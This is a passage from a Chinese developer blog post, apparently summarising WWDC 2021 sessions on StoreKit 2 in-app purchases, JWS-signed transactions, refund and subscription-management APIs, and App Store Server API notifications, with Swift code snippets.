类增加了品项的类型：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> consumable: <span class="type">Product</span>.<span class="type">ProductType</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> nonConsumable: <span class="type">Product</span>.<span class="type">ProductType</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> nonRenewable: <span class="type">Product</span>.<span class="type">ProductType</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> autoRenewable: <span class="type">Product</span>.<span class="type">ProductType</span></span><br></pre></td></tr></table></figure><p>同时也扩展订阅类型的信息。订阅类型的品项，包含 <code>isEligibleForIntroOffer</code>，这个字段的作用是判断，用户是否有资格使用优惠价格进行订阅。借助 StoreKit 2，我们以后就可以更轻松地确定客户是否符合您的推介促销优惠的条件。关于订阅类型的复杂度这里就不展开了，大多数同学可能也接触不多，详细可查看<a href="https://developer.apple.com/cn/app-store/subscriptions/">自动续期订阅</a> 。</p><p>另外，StoreKit 2 向前兼容原来的 Product，添加称为 <code>BackingValue</code> 的包装类型来实现这一点，用于与 App Store 通信的数据类型。详见文档：<a href="https://developer.apple.com/documentation/storekit/backingvalue">BackingValue</a></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d42a66f1c8ed44e3ac5bfbc18a03177a~tplv-k3u1fbpfcp-watermark.image" alt="16239024780063.jpg"></p><p>除了原有的请示品项信息外，购买时，增加了一些可选参数 <code>Purchase opthons</code>。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5d8a31a5e69b44f5a87356e8336d48bd~tplv-k3u1fbpfcp-watermark.image" alt="16239025159619.jpg"></p><p>除了购买数据、<a href="https://developer.apple.com/documentation/storekit/original_api_for_in-app_purchase/subscriptions_and_offers/implementing_promotional_offers_in_your_app">促销优惠</a> 外，最重要的是新字段：<code>App account token</code>！</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c3ad9d5414c547b5b7b621738e07e091~tplv-k3u1fbpfcp-watermark.image" alt="16239025509939.jpg"></p><ul><li>开发者创建 <code>App account token</code></li><li>关联到 App 里的用户账号</li><li><code>App account token</code> 使用 <code>UUID</code> 格式</li><li>在交易(Transcation)订单中永久保存</li></ul><p>这个 <code>App account token</code> 是给开发者将用户的 ID 绑定到交易(Transcation)中，也就是把苹果的交易订单数据与用户信息进行映射，可以起到防止充值掉单的问题啊~</p><p>示例代码：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> uuid <span class="operator">=</span> <span class="type">Product</span>.<span class="type">PurchaseOption</span>.appAccountToken(<span class="type">UUID</span>.<span class="keyword">init</span>(uuidString: <span class="string">&quot;uid&quot;</span>)<span class="operator">!</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Begin a purchase.</span></span><br><span class="line"><span class="keyword">let</span> result <span class="operator">=</span> <span class="keyword">try</span> <span class="keyword">await</span> product.purchase(options: [uuid])</span><br></pre></td></tr></table></figure><p>小编注：<code>UUID</code> 是苹果定义的接口 <code>UUID().uuidString</code> 获取，格式如：<code>4713AE2D-11A5-40EA-B836-CBCD1EC96A76</code>。如果需要关联 用户ID 和开发者订单号，需要开发者自动映射，或者服务器端生成返回等。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ec003af63aa34c29a53f728b0184b241~tplv-k3u1fbpfcp-watermark.image" alt="16239025928468.jpg"></p><p>签名的交易(Transcation)信息:</p><ul><li>每笔交易一个对象</li><li>签名的交易信息，数据格式使用 JWS（JSON Web Signature）</li><li>使用原生接口读取数据</li></ul><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/02937fb09618414d8682daa40bcb66a9~tplv-k3u1fbpfcp-watermark.image" alt="16239043337129.jpg"></p><p>这里插入一下 <a href="https://developer.apple.com/videos/play/wwdc2021/10174/">Manage in-app purchases on your server</a> 里讲解使用 JWS 数据格式的原因：</p><ul><li>1、增强安全性</li><li>2、更容易解码</li><li>3、不用连接苹果服务器验证，开发者本地就可以单独验单！</li></ul><blockquote><p>小编注：JSON Web Token（JWT）是一个规范，这个规范允许我们使用JWT在两个组织之间传递安全可靠的信息。JWT并不等于JWS（JSON Web Signature），JWS只是JWT的一种实现，除了JWS外，JWE(JSON Web Encryption)也是JWT的一种实现。详细查看 <a href="https://tools.ietf.org/html/rfc7515">JWS (RFC 7515)</a><br>JWS的主要目的是保证了数据在传输过程中不被修改，验证数据的完整性。但由于仅采用Base64对消息内容编码，因此不保证数据的不可泄露性。所以不适合用于传输敏感数据。<a href="https://www.jianshu.com/p/50ade6f2e4fd">引用</a></p></blockquote><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/331fe6b953da4c38a2945eed6d545361~tplv-k3u1fbpfcp-watermark.image" alt="16239044220386.jpg"></p><p>这里简单的说一下，拿到的 JWS 格式的 transaction info 格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base64() + &quot;.&quot; + Base64(payload) + &quot;.&quot; + sign( Base64(header) + &quot;.&quot; + Base64(payload) )</span><br></pre></td></tr></table></figure><p>这个 header 与 payload 通过 header 中声明的 alg 加密方式，使用密钥 secret 进行加密，生成签名。然后逆向构造过程，decode出 JWT 的三个部分：</p><ol><li>头部（Header）</li><li>载荷（PayLoad）</li><li>签名（signature）</li></ol><p>验证相关的文档和流程可查看 <a href="https://developer.apple.com/documentation/appstoreserverapi">App Store Server API</a>，这里就不展开了。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/be5e2d2f1d354d529eaac790c0ea3b5d~tplv-k3u1fbpfcp-watermark.image" alt="16239027920065.jpg"></p><p><a href="https://developer.apple.com/videos/play/wwdc2021/10114">视频中</a> 展示了一个完整的 Demo 示例，这里就不展开了。可以自动 <a href="https://developer.apple.com/documentation/storekit/in-app_purchase/implementing_a_store_in_your_app_using_the_storekit_api">下载 Dmeo</a> 查看。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/224a5b9e45984f5e927e387ad21cf8e1~tplv-k3u1fbpfcp-watermark.image" alt="16239028261035.jpg"></p><p>提供了三个新的交易(Transcation)相关的 API:</p><ol><li>All transactions：全部的购买交易订单</li><li>Latest transactions：最新的购买交易订单。（分为订阅品项和除订阅品项外的所有类型二种）</li><li>Current entitlements：当前用户有购买的权限。（全部的订阅品项、和非消耗品项）</li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">15.0</span>, <span class="keyword">macOS</span> <span class="number">12.0</span>, <span class="keyword">tvOS</span> <span class="number">15.0</span>, <span class="keyword">watchOS</span> <span class="number">8.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The most recent transaction for the product, or `nil` if the user has never purchased this product.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">var</span> latestTransaction: <span class="type">VerificationResult</span>&lt;<span class="type">Transaction</span>&gt;? &#123; <span class="keyword">get</span> <span class="keyword">async</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The transaction that entitles the user to this product, or `nil` if the user is not currently entitled to</span></span><br><span class="line">    <span class="comment">/// this product.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">var</span> currentEntitlement: <span class="type">VerificationResult</span>&lt;<span class="type">Transaction</span>&gt;? &#123; <span class="keyword">get</span> <span class="keyword">async</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反正就是很强大的接口：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">15.0</span>, <span class="keyword">macOS</span> <span class="number">12.0</span>, <span class="keyword">tvOS</span> <span class="number">15.0</span>, <span class="keyword">watchOS</span> <span class="number">8.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Transaction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// A sequence of every transaction for this user and app.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> all: <span class="type">Transaction</span>.<span class="type">TransactionSequence</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Returns all transactions for products the user is currently entitled to</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// i.e. all currently-subscribed transactions, and all purchased (and not refunded) non-consumables</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> currentEntitlements: <span class="type">Transaction</span>.<span class="type">TransactionSequence</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Get the transaction that entitles the user to a product.</span></span><br><span class="line">    <span class="comment">/// - Parameter productID: Identifies the product to check entitlements for.</span></span><br><span class="line">    <span class="comment">/// - Returns: A transaction if the user is entitled to the product, or `nil` if they are not.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">func</span> <span class="title">currentEntitlement</span>(<span class="params">for</span> <span class="params">productID</span>: <span class="type">String</span>)</span> <span class="keyword">async</span> -&gt; <span class="type">VerificationResult</span>&lt;<span class="type">Transaction</span>&gt;?</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The user&#x27;s latest transaction for a product.</span></span><br><span class="line">    <span class="comment">/// - Parameter productID: Identifies the product to check entitlements for.</span></span><br><span class="line">    <span class="comment">/// - Returns: A verified transaction, or `nil` if the user has never purchased this product.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">func</span> <span class="title">latest</span>(<span class="params">for</span> <span class="params">productID</span>: <span class="type">String</span>)</span> <span class="keyword">async</span> -&gt; <span class="type">VerificationResult</span>&lt;<span class="type">Transaction</span>&gt;?</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/62f1bd820207416f8d504189235d6f96~tplv-k3u1fbpfcp-watermark.image" alt="16239028673420.jpg"></p><p><code>Current entitlements</code> 这个目前是，方便开发者直接通过接口就能读取当前用户可用的订阅品项和非消耗品项，不用开发者做硬编码写死 productID 请求苹果查询，直接一个接口搞定！特别是对个人开发者来说，确定是很方便，不用搭服务器。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9719b483ae804e04b3bac2091d66f8e0~tplv-k3u1fbpfcp-watermark.image" alt="16239028962697.jpg"></p><p>查询同一个用户在不同的设备上的交易订单，假设用户在 A 设备购买了一笔交易订单，那么在用户的 B 设备上，可以实时查到这个购买的交易订单。苹果工程师说，一般系统会自动刷新，逼不得已不需要使用同步接口刷新。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0b935e1a3aaf4e32b9d21f5c6f0de095~tplv-k3u1fbpfcp-watermark.image" alt="16239029211953.jpg"></p><p>一般情况下，第一次打开 App 时，开发者就可以通过 StoreKit 2 提供的接口在后台实时帮用户恢复购买记录。对于非消耗品项，用户在一个新设备时，可能需要提供给用户恢复购买记录的 UI 入口。而对于订阅类型，比如某个视频网站的月卡，虽然都是登陆一个苹果账号，但是购买时，是绑定到视频网络的用户的，不是绑定到苹果账号下，所以，订阅类型可能就无法直接恢复啊。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c400759d18df41ea980830d4bd132a0a~tplv-k3u1fbpfcp-watermark.image" alt="16239029565139.jpg"></p><p>所有的交易都可以用在所有的 StoreKit 接口；使用 StoreKit v1 的购买记录，在 v2 的接口也可以获取到；使用 v2 进行的购买可在统一收据中获得。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0226732430e94bceb37427d3d70b1bb7~tplv-k3u1fbpfcp-watermark.image" alt="16239029829279.jpg"></p><p>订阅类型项目的状态，比如获取最新的交易、获取更新订阅的状态，获取更新订阅的信息等。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/51b8e9f90a814c5087d59d4c9e353be3~tplv-k3u1fbpfcp-watermark.image" alt="16239030330448.jpg"></p><p>其中获取更新订阅的信息，可以获取更新的状态、品项 id、如果过期的话，可以知道过期的原因。（比如用户取消、扣费失败、订阅正常过期等。），获取的所有数据都是 JWS 格式验证。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b76d43d2f8334ccaab0e99bc6f19bbb3~tplv-k3u1fbpfcp-watermark.image" alt="16239037808982.jpg"></p><p>最后，是签名校验，上面已经提到，这里就不在展开。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3860df68e0ac4a9a8b9012513b07eea5~tplv-k3u1fbpfcp-watermark.image" alt="16239038068883.jpg"></p><p>苹果工程师建议，因为校验是用到 bundle ID (应用包名)，所以建议是写死硬编码，不要读取 info.plist 文件配置。然后按规则格式进行验证 payload 是否被篡改。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5f9ae01e02ea4825b346d4b839ede901~tplv-k3u1fbpfcp-watermark.image" alt="16239038541866.jpg"></p><p>StoreKit v2 提供了验证 JWS 格式的 API，开发者可以直接调用，不需要自行解析。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6bd1e68df89c4cb780a5f2b9360214a2~tplv-k3u1fbpfcp-watermark.image" alt="16239039254740.jpg"></p><p>StoreKit v2 总结来说，强大的新 IAP 接口，新的 JWS 交易信息格式，交易详细内容和历史接口，额外的订阅类型信息。总之，牛逼~</p><h4 id="2-3、Manage-subscriptions-API"><a href="#2-3、Manage-subscriptions-API" class="headerlink" title="2.3、Manage subscriptions API"></a>2.3、Manage subscriptions API</h4><h5 id="How-can-subscribers-manage-their-subscription-inside-my-app"><a href="#How-can-subscribers-manage-their-subscription-inside-my-app" class="headerlink" title="How can subscribers manage their subscription inside my app?"></a>How can subscribers manage their subscription inside my app?</h5><p>订阅者如何在我的应用内管理他们的订阅？</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/231142a320944c0daed9b4dbaf05176b~tplv-k3u1fbpfcp-watermark.image" alt="16239121193616.jpg"></p><p>提供了新的 API，可以直接在开发者 App 中显示用户当前的订阅品项界面，不用在跳转到 App Store 。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/15bdda201b3f467ea312c9c37d9a367b~tplv-k3u1fbpfcp-watermark.image" alt="16239121374973.jpg"></p><p>接口如上，调用后，打开的界面如下：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/416d9505615c419ea0563074d0d4bd28~tplv-k3u1fbpfcp-watermark.image" alt="16239122177825.jpg"></p><p>可以在开发者 App 中取消订阅、升级或降级订阅等级等。</p><h4 id="2-4、Request-refund-API"><a href="#2-4、Request-refund-API" class="headerlink" title="2.4、Request refund API"></a>2.4、Request refund API</h4><h5 id="How-can-customers-request-a-refund-inside-my-app"><a href="#How-can-customers-request-a-refund-inside-my-app" class="headerlink" title="How can customers request a refund inside my app?"></a>How can customers request a refund inside my app?</h5><p>客户如何在我的应用内申请退款？</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/27de47bd950e40a2ad45fe0bce4826f7~tplv-k3u1fbpfcp-watermark.image" alt="16239122897971.jpg"></p><p>提供新的 Request refund API，允许用户在开发者的 App 中直接进行退款申请。</p><p>用户进行申请退款后，App 可以收到通知、另外苹果服务器也会通知开发者服务器（下文会有说），退款测试在沙盒环境下，可以进行测试啦！</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7dd76dd902df4235882327260c0fe87a~tplv-k3u1fbpfcp-watermark.image" alt="16239123152291.jpg"></p><p>接口如上，调用后，打开的界面如下：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0b5e23951f0a4965a6adb2f0be7ce7af~tplv-k3u1fbpfcp-watermark.image" alt="16239123369438.jpg"></p><p>用户退款的流程界面（这个是系统的界面），所以可能对用户是很方便啦，对开发者来说，可能就需要在考虑一下？</p><h3 id="三、Server-to-Server"><a href="#三、Server-to-Server" class="headerlink" title="三、Server to Server"></a>三、Server to Server</h3><p>接下来，我们说说，苹果服务器 API 接口的更新。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/acc1cbcb437c417dae8c56e926292dcd~tplv-k3u1fbpfcp-watermark.image" alt="16239041139339.jpg"></p><p>如图，苹果服务器、用户设备、开发者服务器，三者之间的交互越来越多，随着苹果的迭代和开放，三者如今已经成循环~</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b0e67752060437e8d9d9513139cafea~tplv-k3u1fbpfcp-watermark.image" alt="16239040419267.jpg"></p><p>构建开发者的服务器：</p><ol><li>接收苹果内购的状态改变通知</li><li>通过接口跟踪内购状态改变</li><li>随时验证访问权限(就是用户的购买是不是有效的，比如用户退款了)</li><li>管理订单状态</li><li>跟踪退款</li></ol><p>接下来，将会从以上几个方面展开说：</p><h4 id="3-1、Validate-status-with-receipts"><a href="#3-1、Validate-status-with-receipts" class="headerlink" title="3.1、Validate status with receipts"></a>3.1、Validate status with receipts</h4><p>Receipt 收据验证方式：</p><ol><li>在用户设备App中验证收据</li><li>在开发者服务端通过苹果 <code>/verifyReceipt</code> 接口验证收据</li></ol><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/410e9ceeed1940c78635f37ffb9debf8~tplv-k3u1fbpfcp-watermark.image" alt="16239042732936.jpg"></p><p>旧的 receipts 收据内容如上图。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/468683656d6b41669d326b906f2914ab~tplv-k3u1fbpfcp-watermark.image" alt="16239044220386.jpg"></p><p>新的 JWS 格式的交易格式内容，如上图。对比 receipts 收据，可以知道有那些变化：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a86119e5abad4a38b506e3a41dd0f1b3~tplv-k3u1fbpfcp-watermark.image" alt="16239046070348.jpg"></p><p>旧的有 GMT（格林威治标准时间）、PST（太平洋标准时间）、Unix timestamp（Unix 时间戳），新的格式，只保留了 <code>Unix 时间戳</code>，并且字段做了更新。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5541d86377ff495fb4091dd545e716bd~tplv-k3u1fbpfcp-watermark.image" alt="16239046340854.jpg"></p><p>内购的类型，也有返回了。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5056435e958b46fcaab891402bab0b4a~tplv-k3u1fbpfcp-watermark.image" alt="16239046558338.jpg"></p><p>这个就是上面提到的关系的用户信息的 UUID。这里苹果用 <code>appAccountToken</code> 字段。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fe8075281e284e1b84bbd33cc3936331~tplv-k3u1fbpfcp-watermark.image" alt="16239046878608.jpg"></p><p>这个是用户退款时间和退款原因的字段。从之前的 <code>cancellation_date</code> 改成现在的 <code>revocationData</code>。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0ab055faf0dd43a8936d6ce6f5c8c04b~tplv-k3u1fbpfcp-watermark.image" alt="16239047119969.jpg"></p><p>最后是促销优惠的类型。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1f394c9ea3d34c3796118fa63b2616dd~tplv-k3u1fbpfcp-watermark.image" alt="16239047433331.jpg"></p><p>验证签名信息，这里就不多说了，上文已经说过了。</p><h4 id="3-2-Check-status-with-APIs"><a href="#3-2-Check-status-with-APIs" class="headerlink" title="3.2 Check status with APIs"></a>3.2 Check status with APIs</h4><p><strong>使用 APIs 检查状态</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c30d292bbfff488a994cace47559aade~tplv-k3u1fbpfcp-watermark.image" alt="16239049485781.jpg"></p><p>新提供了2个接口：</p><ol><li>订阅品项状态查询 API</li><li>内购历史订单查询 API</li></ol><h5 id="获取用户所有订阅的状态"><a href="#获取用户所有订阅的状态" class="headerlink" title="获取用户所有订阅的状态"></a>获取用户所有订阅的状态</h5><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b648bf0361704b3895b470e2e4a0c9dd~tplv-k3u1fbpfcp-watermark.image" alt="16239049731702.jpg"></p><p>先来看看订阅品项状态查询 API。需要参数只有一个：<code>originalTransactionId</code>，这个大家很熟悉了，就不展开了。详细文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/get_all_subscription_statuses">Get All Subscription Statuses</a></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0983a7876cda43f5856151eb935afa92~tplv-k3u1fbpfcp-watermark.image" alt="16239052348234.jpg"></p><p>接口请求和返回的数据格式示意如上。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/586b808a87a04b819a2b033cb350667f~tplv-k3u1fbpfcp-watermark.image" alt="16239052667517.jpg"></p><p><code>lastTransactions</code> 是最后的订阅状态，1是有效，2是过期，3是账号扣费重试，4是账号宽限期(这个是开发者设置，比如到期扣费失败时，可以给用户延期多长时间。)，5是已经撤销。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/15154efceee343af943a6d365fde5c0d~tplv-k3u1fbpfcp-watermark.image" alt="16239053630326.jpg"></p><p>对 <code>signedTransactionId</code> 进行 JWS 解码后的内容，就是单个更新订阅类型的数据内容。</p><h5 id="获取交易的历史订单"><a href="#获取交易的历史订单" class="headerlink" title="获取交易的历史订单"></a>获取交易的历史订单</h5><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/64f71e4eb03e4c50a11835d1dc4c7389~tplv-k3u1fbpfcp-watermark.image" alt="16239053896385.jpg"></p><p>获取用户的交易历史记录，包括他们在你的 App 中的所有应用内购买。 也是只需要参数一个：<code>originalTransactionId</code>，注意，只需要是用户的任意一个交易的 originalTransactionId 就可以啦。这个大家一看就明白了，就不展开了。详细文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">Get Transaction History</a></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/63f9204239eb463f82a98be56b840c38~tplv-k3u1fbpfcp-watermark.image" alt="16239054248179.jpg"></p><p>需要注意的是，这个返回的数据有一个字段 <code>hasMore</code> 为 ture，表示有更新的历史订单有更新，默认是 20 条。目前开发者不能控制这个条数。</p><h5 id="App-Store-Server-API-验证"><a href="#App-Store-Server-API-验证" class="headerlink" title="App Store Server API 验证"></a>App Store Server API 验证</h5><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cf8e153faf4d454d9a0e39f1172790ed~tplv-k3u1fbpfcp-watermark.image" alt="16239054795105.jpg"></p><p>App Store Server 接口标准：</p><ul><li>JWT 认证</li><li>JWS 交易内容格式</li><li>Json 请求和响应</li><li>基于 originalTransactionId 标识参数</li></ul><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b09de643c0b4ba1826943283568f761~tplv-k3u1fbpfcp-watermark.image" alt="16239056226807.jpg"></p><p>所有的 App Store Server API 接口都必须使用 JWT 认证，关于验证规则和流程，请查看文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/generating_tokens_for_api_requests">Generating Tokens for API Requests</a></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c0673f69d73446afbbf2dd6d70ce95b0~tplv-k3u1fbpfcp-watermark.image" alt="16239056616443.jpg"></p><p>在苹果后台生成私钥的示例，详见文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/creating_api_keys_to_use_with_the_app_store_server_api">Creating API Keys to Use With the App Store Server API</a></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/786d09df5b1249039f2c006966cb3f3d~tplv-k3u1fbpfcp-watermark.image" alt="16239057988349.jpg"></p><p>验证可查看文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/generating_tokens_for_api_requests">Generating Tokens for API Requests</a></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e972648c5648492c93fc6a73ef8eed63~tplv-k3u1fbpfcp-watermark.image" alt="16239058531137.jpg"></p><p>所以，如果需要使用 App Store Server API 查询订阅品项状态或用户的历史订单，关键要点：</p><ul><li>独立的状态和历史功能</li><li>只需要提供 originalTransactionId</li><li>获取已验证签名的交易并存储必要字段（比如 <code>originalTransactionId</code>）</li><li>无需存储已验证签名的完整交易数据（也就是验证过的 JWS 内容，只需要保存 originalTransactionId 字段就可以了，<code>一个字段走天下！给我们点个赞吧~</code>）</li></ul><h4 id="3-3、Track-status-with-notifications"><a href="#3-3、Track-status-with-notifications" class="headerlink" title="3.3、Track status with notifications"></a>3.3、Track status with notifications</h4><p><strong>通过通知跟踪状态！</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b763a55e47344492a7a661593727581d~tplv-k3u1fbpfcp-watermark.image" alt="16239059171973.jpg"></p><p>苹果服务器的通知更新，苹果说很好，开发者可以接受通知、更新的状态也及时？不需要开发者主动请求询问！行吧，你说的都对~</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0d962ed7cd0a4b65a8f7a9d41ae2893d~tplv-k3u1fbpfcp-watermark.image" alt="16239059397630.jpg"></p><p>苹果服务器通知 v2 版本的更新，这里就不展开了。好像没有什么好说的，跟上文的差不多。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ad917750bd294a019b8cf3a849524ccd~tplv-k3u1fbpfcp-watermark.image" alt="16239059639867.jpg"></p><p>主要变动是，通知的类型，有一部分是删除了，也新增了一些通知类型。</p><blockquote><p>小编注：变动的原因，有很多方面，主要是苹果的自动订阅类型品项，越来越复杂了，所以有一些字段意义已经不大，另外，苹果新推出的家庭共享功能，主账号可以授权家庭子账号或者撤销授权。所以 <code>CANCEL</code> 取消类型就不明确意义了，所以更新为 <code>REVOKE</code> 撤销，他的含义和作用更多，可以是用户申请退款或者授权取消，都是撤销的一个。</p></blockquote><p>当然，这里变动这么多，苹果不可能在原来的接口直接改啊！所以是有 v1 和 v2 接口，开发者可以设置，下文会提到，这些先略过。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/aaa0cde8c3c14e45bc3c90a3b8ec6202~tplv-k3u1fbpfcp-watermark.image" alt="16239060034850.jpg"></p><p>另外，订阅的类型下，还有子类型。这个也好理解。比如 <code>SUBSCRIBED</code> 订阅，可以是首次订阅的状态，也可以是重新订阅的状态，都是订阅。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/042daa6f8cb34627a3271912bd34610a~tplv-k3u1fbpfcp-watermark.image" alt="16239060511979.jpg"></p><p>然后就展开了通知主类型，有那些子类型。如下这些，就不展开了，大家看看图片就好：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c4d755307ea64634ac45400f40470380~tplv-k3u1fbpfcp-watermark.image" alt="16239060729187.jpg"></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ff8f124d469845c48aaf84689e7f2599~tplv-k3u1fbpfcp-watermark.image" alt="16239060939542.jpg"></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/595b85f112284e2c89f17b27497314a5~tplv-k3u1fbpfcp-watermark.image" alt="16239064391553.jpg"></p><p>最后，关于订阅，有非常多的状态，所以，订阅品项的通知的复杂度就不言而喻！</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bd2f4da5480647db8ebaf69b87f3aeab~tplv-k3u1fbpfcp-watermark.image" alt="16239064941047.jpg"></p><p>总结来说，App Store server notifications V2 提供了多达20多种通知类型！子类型提供了更精细的通知类型！</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5990dd90b80b4829a5ab25d7bf13e852~tplv-k3u1fbpfcp-watermark.image" 